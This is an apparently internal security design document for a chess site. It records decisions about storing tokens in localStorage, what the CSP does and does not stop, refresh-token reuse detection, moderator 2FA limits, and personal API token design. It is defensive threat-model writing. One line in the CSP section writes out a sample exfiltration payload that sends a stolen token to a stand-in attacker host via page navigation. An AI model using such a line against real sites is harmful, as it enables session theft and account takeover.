# Authentication & sessions

Decisions about credentials and session lifetime, with the reasoning that produced them. The
mechanisms themselves are described where they were built (Phase 6b for the token lifecycle, 6b3 for
OAuth, 9d.2 for the second factor); this file exists for the choices those phases made without
writing down why, which is a different failure from not making them.

---

## 1. Where tokens live (10c.6)

**Decided 2026-08-17: the access token and the refresh token both stay in `localStorage`.** The
alternative, moving the refresh token to an `HttpOnly; Secure; SameSite` cookie on the API host, is
described in § 1.6 along with the three costs that decided against it, and § 1.7 lists the
conditions that should reopen it.

The decision is deliberately recorded as _acceptance of a known exposure_, not as a claim of safety.
**Any script execution on the frontend origin is a full account takeover**, and nothing below
changes that. What the sections below establish is the blast radius, how long it lasts, and which of
the mitigations this repository already believes in are actually load-bearing. Two of them turn out
not to be.

### 1.1 What is stored today

One `localStorage` key, `cs_auth`, written by [AuthProvider.tsx](../../ui/components/AuthProvider.tsx),
holding a JSON blob with `userId`, `email`, `displayName`, `roles`, `expiresAt`, the **access token**
and the **refresh token**. [api.ts](../../ui/lib/api.ts) holds both in module scope and re-persists the
pair on every silent rotation.

| Credential         | Lifetime                                        | Where it is stored                          | What holding it gets you                                                          |
| ------------------ | ----------------------------------------------- | ------------------------------------------- | --------------------------------------------------------------------------------- |
| Access token (JWT) | **15 minutes** (`JwtOptions.ExpiryMinutes`)     | `localStorage`, and module scope in `api.ts` | Every authenticated call, including `/moderation/*` if the token carries the role |
| Refresh token      | **30 days**, sliding (`RefreshTokenExpiryDays`) | same                                        | An indefinite chain of new access tokens, renewed on each use                     |

The server side is careful in the ways that matter once a token reaches it: refresh tokens are
random 256-bit values stored only as SHA-256 hashes
([RefreshTokenService.cs](../../src/KiriChess.Server/Auth/RefreshTokenService.cs)), every use rotates,
and the access token carries no secret beyond its own signature. None of that is a control over
where the client keeps the value, which is the whole subject of this section.

### 1.2 The exposure, stated plainly

An attacker who can run script on `kirichess.com` reads `cs_auth`, and the 30-day refresh token in
it is the prize rather than the 15-minute access token. It is the long-lived credential that 6b.1
built rotation and reuse detection around, and it survives the tab, the browser restart, and the
victim's own logout on another device.

**The exposure is not conditional on the site being interesting.** It is conditional on script
execution, and the surface for that is the same for a chess site as for anything else: a dependency
in `ui/`, a rendering path that trusts server-supplied text, or a future feature that takes user
content. Display names are already user-supplied and already rendered next to every game.

### 1.3 The CSP is a real control and it does not stop this

The roadmap item that produced this file records that "9c.1's CSP is the mitigation, and it is a
real one". **That is half right, and the half it gets wrong is the half people rely on.**

[next.config.ts](../../ui/next.config.ts) ships `script-src 'self' 'unsafe-inline'` (plus Turnstile's
origin when it is configured), and the comment above it explains why at length: the App Router's
inline hydration payload ships on every page, most of this app's routes are statically prerendered,
and a middleware-minted nonce never reaches a prerendered page's cached HTML. The reasoning is
correct, and the consequence is that **`'unsafe-inline'` admits injected inline script**. The CSP
does not prevent XSS from executing here. It was never going to.

What it does do, and this is genuinely valuable, is constrain where a payload can send what it
steals. As of `buildCsp()` (updated here 2026-09-05, S-1-11 - this section had drifted from the
shipped policy): `connect-src` is `'self'` plus the API origin (http and ws), Sentry and Turnstile
when configured; `img-src` is `'self' data: blob:` plus the API origin - the widest of any
directive here, `blob:` is the avatar cropper's output and the API origin is a served avatar image,
both same-origin or first-party in effect, neither an outbound channel; `worker-src` is `'self'`
(Stockfish, loaded as a same-origin Worker); `frame-src` is Turnstile's origin when configured (the
challenge iframe); `form-action` is `'self'`; `object-src` is `'none'`. An injected script cannot
`fetch` the token to an attacker-controlled host, cannot leak it through an image URL, cannot open it
in a frame or a worker from anywhere but the origins named above, and cannot post it through a form.

**It can still leak it through a top-level navigation.** CSP has no directive that survives to
constrain `location = "https://attacker.example/?t=" + token` (`navigate-to` was dropped from the
specification and is implemented nowhere). So the honest statement is: the CSP raises the cost of
exfiltration from trivial to slightly less trivial, and it meaningfully limits a payload that wants
to stay quiet. It is not a barrier between an XSS and the refresh token.

Recorded here rather than as a change to 9c.1, because the CSP is correct as written. The error was
in what this project believed the CSP was buying.

### 1.4 The reuse detector, and what it actually buys

`RotateAsync` treats presentation of an **already-revoked** token as evidence of theft and revokes
every active token for that user. This is a real backstop, and it is worth being precise about its
shape, because it detects rather than prevents, and the detection is driven by the victim.

- **The victim keeps browsing.** Both parties rotate the same chain, one of them presents a
  superseded token within minutes, and every session for the account dies. Theft is converted into a
  logged-out user and a mystery. This is the good case and it is the common one.
- **The victim closes the laptop.** The attacker rotates quietly for as long as they like. Nothing
  detects anything until the victim comes back, and the 30-day window is the attacker's.
- **Either way, detection is a revocation, not an alarm.** No notification is sent, nothing is logged
  as a security event, and the victim's experience is being asked to log in again. The signal exists
  and reaches nobody.

So the backstop bounds the _duration_ of a stolen session in the active case, and does nothing in the
idle one. It is worth keeping, and it is not a reason to be relaxed about storage.

### 1.5 The moderator case (9d.2), addressed explicitly

The roadmap's sharpest observation about this item is that **the accounts most worth stealing are the
ones this storage choice protects least**, and reading 9d.2 against this section confirms it rather
than softening it.

`TokenService.CreateToken` adds the `mfa` claim when `user.TwoFactorEnabled` is set, and
`ModerationPolicies.Admin` requires it on top of the role. The comment there is accurate about why
that is sound: enabling or disabling 2FA revokes every refresh token, so no surviving token carries a
stale claim. **What it does not say, and what matters here, is that the claim rides the refresh
chain.** A refresh token lifted from a moderator's `localStorage` mints access tokens carrying the
`Admin` role _and_ the `mfa` claim, indefinitely, without the thief ever meeting a TOTP prompt.

**TOTP is a control on authentication, and there is no step-up on any moderation action.** Bans,
sanctions and report resolution are gated by a claim on a token, and that token is derivable from a
string in a browser's `localStorage`. 9d.2 made moderator accounts harder to log into and did not
make a stolen moderator session harder to use, which are different properties that the phrase "2FA
for moderators" reads as covering.

**This is accepted, for now, on grounds that are narrow:** there is exactly one `Admin` account, it
belongs to the person who owns the deployment, and it is used from a browser they control. The
acceptance is a statement about there being one moderator, so it expires when a second is appointed.
**§ 1.7 makes that a trigger rather than a hope.**

The cheap mitigation, if that trigger fires and the cookie move is still unattractive, is a shorter
`RefreshTokenExpiryDays` for accounts in the `Admin` role: 30 days is sized for a player's
convenience and a moderator is not that. It is a server-side change with no cross-origin consequences
at all, which is the property § 1.6 keeps failing to have.

### 1.6 The road not taken: an `HttpOnly` refresh cookie

Move the refresh token to a cookie on `api.kirichess.com` and leave only the 15-minute access token
in JS. It is the standard answer, and it is not free here.

**What it would actually buy, stated honestly.** It does not prevent takeover. Script on the frontend
origin can still call `POST /api/auth/refresh` with `credentials: "include"` and read the new access
token out of the response body, for as long as the page is open. What it prevents is the attacker
walking away with a **persistent** credential usable from their own machine, later, after the tab is
closed. That is a real reduction, and it is narrower than the word "HttpOnly" usually implies.

**Cost one: staging and production would not behave the same way.** Production is `kirichess.com`
calling `api.kirichess.com`, which are the same site, so a `SameSite=Lax` cookie rides a same-site
subresource request. Staging is `kirichess-ui-staging.fly.dev` calling `kirichess-api-staging.fly.dev`
([fly.ui.staging.toml](../../fly.ui.staging.toml)), and `fly.dev` is on the Public Suffix List, so those
two are different **sites**, not merely different origins. A `Lax` cookie works in production and is
silently dropped in staging; making staging work requires `SameSite=None`, which is then also what
production ships, i.e. the fully cross-site credentialed path. **The environment built to catch the
first mistake would be the one place this mechanism is not the mechanism production runs**, which is
exactly the class of defect Phase 10 was written about. Verify the Public Suffix behaviour in a real
browser before relying on either half of this paragraph.

**Cost two: it reintroduces a credentialed cross-origin path, and this deployment has broken on one
before.** DH.3 records that `api.kirichess.com` had to be pulled out of the Cloudflare Access gate
because Access authenticates by a cookie scoped to the hostname, and "this app's frontend calls a
separate API host with JWT bearer tokens rather than credentialed cross-origin cookies" was the
property that made removing it safe. Registration broke in a way that surfaced as "Something went
wrong". Reintroducing cookies on that path does not recreate that bug, and it does move this
deployment back into the shape where edge configuration and application auth interact.

Note what is _not_ a cost: CORS already sets `AllowCredentials()`
([Program.cs:170](../../src/KiriChess.Server/Program.cs#L170)), for SignalR's negotiate request. That
half is paid.

**Cost three: CSRF becomes a live concern for the first time.** A bearer-token API has no ambient
authority to abuse. A cookie-bearing `/api/auth/refresh` does, and under `SameSite=None` a cross-site
POST reaches it. The consequence is bounded, since the attacker cannot read the rotated pair back
through CORS, so it is forced rotation rather than theft. Bounded is not absent, and it is a new
category of thing to get right in an endpoint that currently has none.

**Against three costs, one narrowed benefit.** The move is the right one for an application with
untrusted moderators, third-party scripts, or a user-content surface worth attacking. This one has
none of those yet, which is a statement with an expiry date, hence § 1.7.

### 1.7 What reopens this

Any one of these, on its own:

1. **A second moderator**, i.e. an `Admin` account that is not the deployment owner's. § 1.5's
   acceptance is entirely a statement about there being one, and appointing a second person makes a
   stolen session someone else's problem to explain.
2. **A third-party script on the frontend origin.** Analytics, a widget, an embed. Today the only
   external script is Turnstile's, on one route, from Cloudflare. Each addition converts a
   supply-chain compromise into a session-database compromise.
3. **Rendered user content beyond a display name**, e.g. chat, profile text, game annotations. That
   is 11b.1 and 11b.2 territory, and both are open.

   **One surface has already shipped, and it does not fire this trigger.** Report `Details`
   ([ReportEndpoints.cs:35-38](../../src/KiriChess.Server/Moderation/ReportEndpoints.cs#L35-L38))
   accepts up to 1000 characters of free text chosen by the reporter, and the moderation page
   (`ui/app/[locale]/moderation/page.tsx:232-238`) has rendered it since
   6e.2. This paragraph exists because a reader of the list above would otherwise conclude no such
   content is rendered, which stopped being true a while ago; the trigger list is the mechanism that
   is supposed to notice, so an unrecorded surface is the failure, not the surface itself.

   Three properties keep it below the bar, and each is checkable rather than asserted. It is
   rendered as a JSX text child, so React escapes it; there is **no HTML sink anywhere in `ui/`**,
   verified by `grep -rn "dangerouslySetInnerHTML" ui/app ui/components ui/lib` returning nothing on
   2026-09-03; and the route is behind `ModerationPolicies.Admin`
   ([ModerationEndpoints.cs:23](../../src/KiriChess.Server/Moderation/ModerationEndpoints.cs#L23)),
   so the only session that ever loads the text is the one § 1.5 already accepts on the basis that
   there is exactly one `Admin` account. Attacker-chosen text that cannot become markup, on a page
   only the deployment owner opens, does not convert a supply-chain or injection foothold into
   anything § 1.6 would fix: an attacker who can run script on that origin already has the token.

   **What would fire it**, either one on its own: rendering that text as HTML or Markdown, whether
   through `dangerouslySetInnerHTML`, a sanitiser, or a renderer that emits markup; or exposing it
   outside the moderation page, to a second moderator, to the reported user, or on any player-facing
   surface. The first makes the escaping argument false; the second makes the staff-only argument
   false, and note that the second overlaps trigger 1, since appointing a second moderator widens
   this surface at the same time.
4. **Staging and production ceasing to be different sites**, i.e. staging moving to a
   `*.kirichess.com` hostname. That deletes cost one outright and makes the cookie move a much
   smaller decision than it is today.

### 1.8 Operator surfaces use the session, not a second secret

Before AD.6+11a.3, [the analytics page](../../ui/app/analytics/page.tsx) stored a static
`Analytics:AccessToken` under `kirichess.analytics.token`. That shared secret did not expire, did not
rotate, and had no reuse detector. AD.6+11a.3 deleted it: the whole `/api/analytics` surface is behind
`ModerationPolicies.Admin`, the same role/JWT-backed policy as moderation, and the page keeps nothing
in `localStorage`. The session cookie in §1.3 is the only credential the operator UI holds.

## 2. API tokens (Phase 9f.5)

The public/bot surface at `/api/v1` does **not** accept the session JWT. It authenticates a
personal access token (`kirichess_pat_...`), stored as a SHA-256 hash the same way a refresh token
is, with scopes exactly `read` and `play`. Token management (`/api/account/api-tokens`) is JWT-only:
a bot token cannot mint, list or revoke tokens.

**The shape is meant to be recognised by a secret scanner (S-4-3).** The prefix is
`kirichess_pat_`. After it come 43 characters, the URL-safe base64 of 32 random bytes with the
padding stripped, then 6 checksum characters. The checksum is CRC-32 (IEEE / ISO-HDLC) of those 43
characters only, encoded in base62 with the alphabet
`0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz` and padded on the left with zeros
to 6 characters. A string that fails the checksum is not looked up. Tokens minted with the earlier
`kc_` prefix do not authenticate; re-issue them. The same rule is written on `/developers`.

**Scheme isolation is load-bearing.** The app's default authenticate/challenge scheme stays JWT, so
existing `RequireAuthorization()` routes keep rejecting a `kirichess_pat_` bearer. V1 names the `ApiToken`
scheme. `/hubs/game` uses a hub-only `HubAuth` policy scheme that selects `ApiToken` when the
bearer/query value starts with `kirichess_pat_`, otherwise JWT. Presence stays JWT. A token principal never
carries `role` or `mfa`, even when the owning account is an admin with 2FA.

**A token expires.** `POST /api/account/api-tokens` takes an optional `ExpiresInDays`. Omitted means
90 days. The allowed range is 1 through 365, so a caller cannot mint a permanent key. `IssueAsync`
writes `ExpiresAt`. Rows that were issued with a null expiry are backfilled to `CreatedAt` plus 90
days. The profile card shows that date.

**Signing out everywhere, and turning 2FA on or off, must not revoke API tokens.** Independence from
the browser session is the point. An `AccountBan`, account erasure, and a **password reset** do
revoke them. The reset is on that side because it is the one action a compromised account is told to
take, so it has to end every credential the takeover could have minted, not just the session ones;
the paragraph below is exactly the reason a live PAT would otherwise survive it. Signing out is
routine and a reset is the recovery action, which is what keeps the two decisions from contradicting
each other. Enforced at `/api/auth/reset-password` (`AuthEndpoints.cs`), which calls
`ApiTokenService.RevokeAllForUserAsync` beside the refresh-token revoke, the same pairing
`SanctionService` uses for a ban.

**XSS can mint a PAT from a stolen JWT.** § 1 already accepts that any script on the frontend origin
is a full account takeover. With API tokens that blast radius grows: a payload that can call
`POST /api/account/api-tokens` while the stolen access token is live can issue a key that survives
the 15-minute JWT and the victim's own logout. **S-1-2 closed the bearer-only half of that:** minting
a PAT now requires the account password when one exists, so a stolen access token alone is not
enough. Google-only mint still skips, because there is no password to ask. The remaining mitigation
on the profile page is list, one-time reveal, and revoke. There is no other recovery besides revoke
or erasure. Do not treat a PAT as a second, safer secret than the refresh token; it is a longer-lived
one the victim has to notice.

**S-1-2, 2FA enable and disable, and erasure.** Enabling 2FA requires the password, or for a
Google-only account a just-issued Google reauth code consumed for that same user. A stolen JWT is
not enough on either branch; the Google-only enable path is not closed by "they already have a
session". Disabling 2FA and deleting the account require the password when the account has one.
Google-only accounts skip on disable and delete, otherwise they could not turn 2FA off and Art. 17
erasure would close. Wrong secrets return 400 with the existing `{ error }` envelope, never 401
(the generated client retries the identical body after a silent refresh, so 401 on `/delete` would
re-fire erasure) and never 403 (already means banned).
